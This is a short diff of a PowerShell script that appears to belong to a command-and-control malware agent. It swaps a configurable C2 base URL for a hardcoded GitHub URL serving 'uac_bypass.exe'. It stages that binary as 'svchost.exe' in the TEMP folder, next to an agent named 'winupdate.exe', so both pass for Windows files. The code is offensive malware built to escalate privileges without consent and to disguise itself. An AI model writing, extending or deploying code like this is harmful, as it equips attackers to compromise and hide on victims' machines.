@@ -81,13 +81,8 @@ $alreadyElevated = Test-Path $regFlag
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $alreadyElevated -and -not $isAdmin) {
-    $c2Base = $env:C2BaseURL
-    if (-not $c2Base) {
-        Write-Output "❌ C2BaseURL not set. Cannot download bypass."
-        exit 1
-    }
-
-    $bypassUrl = "$c2Base/bin/uac_bypass.exe"
+    # Direct raw GitHub URL for the bypass executable
+    $bypassUrl = "https://raw.githubusercontent.com/Peter211231231231232131/C2_ServerV2/main/bin/uac_bypass.exe"
     $bypassPath = "$env:TEMP\svchost.exe"
     $tempAgent = "$env:TEMP\winupdate.exe"
 
